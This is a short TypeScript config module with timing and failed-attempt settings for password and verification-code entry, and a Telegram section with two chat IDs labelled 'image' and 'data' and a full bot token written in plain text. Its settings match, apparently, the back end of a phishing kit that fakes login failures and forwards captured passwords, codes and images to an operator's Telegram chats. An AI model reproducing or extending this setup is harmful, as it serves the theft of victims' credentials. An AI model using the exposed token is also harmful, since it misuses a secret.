interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    image_chatid: string;
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 4,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    image_chatid: "-4866973261",
    data_chatid: "-4916305961",
    data_token: "7713759529:AAHFoCdtWojn5A9p93G-_gLWuUk97XMukvA"
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
